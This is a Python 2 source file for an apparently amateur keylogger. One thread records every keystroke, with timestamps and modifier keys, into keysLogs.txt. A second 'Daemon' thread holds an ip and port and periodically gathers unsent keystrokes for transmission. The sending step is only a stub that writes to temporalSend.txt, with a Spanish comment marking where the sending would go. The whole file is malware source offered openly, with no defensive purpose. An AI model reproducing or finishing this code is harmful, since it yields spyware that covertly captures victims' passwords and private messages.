from keylogger import log
import time
import threading
import json
def logKeys(t, modifiers, keys):
    print "%.2f   %r   %r" % (t, keys, modifiers)

#now = time()
#done = lambda: time() > now + 60
#log(done,logKeys)

class Keylogger(threading.Thread):
    
    def __init__(self,files,maxTime=60,**kw):
        threading.Thread.__init__(self,**kw)
        self.maxTime = maxTime
        self.files = files

    def run(self):
        now = time.time()
        done = lambda: time.time() > now + self.maxTime*60
        log(done,self._save_key);

    def _save_key(self,t,modifiers,key):
        tmpDict = {
            'time':t,
            'modifiers':modifiers,
            'key':key,
            'send':False
        }
        self.files.lock.acquire()
        self.files.fileW.write(json.dumps(tmpDict)+',')
        self.files.fileW.flush()
        self.files.lock.release()
       
class Daemon(threading.Thread):
    def __init__(self,files,ip=False,port=False,timeSleep=5,**kw):
        self.ip = ip
        self.port = port
        self.timeSleep = timeSleep
        self.files = files
        threading.Thread.__init__(self,**kw)

    def run(self):
        while True:
            time.sleep(self.timeSleep)
            print "leeeeeeeee_____________"

            self.files.lock.acquire()

            read = self.files.fileR.read()
            infoKeys = json.loads('['+read[:-1]+']')

            toSend = []
            for i in infoKeys:
                if i.get('send',True) == False:
                    toSend.append(i) 
                    i['send'] = True

            if self._send_data(toSend):
                print "ENVIADOOOOOOO",toSend
            else:
                self.files.fileW.write(read)
                self.files.fileW.flush()        

            self.files.lock.release()
        

    def _send_data(self,keys):
        t = open('temporalSend.txt','w+')
        t.write(json.dumps(keys))
        t.close()
        #si lo envio!
        return True

class FileWR(object):
    
    def __init__(self,fileW,fileR,lock):
        self.fileW = fileW
        self.fileR = fileR
        self.lock = lock

if __name__ == '__main__':

    lock = threading.Lock()
    fileKeys = open('keysLogs.txt','w+')
    fileKeysRead = open('keysLogs.txt','rt')
    
    f = FileWR(fileKeys,fileKeysRead,lock)

    daemon = Daemon(f)
    daemon.start()

    ky = Keylogger(f)
    ky.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print "stop all"
        for thread in threading.enumerate():
            if thread.isAlive():
                try:
                    thread._Thread__stop()
                except:
                    print 'No se pudo matar todos los threads'
        
        fileKeys.close()
        fileKeysRead.close()
        exit(0)
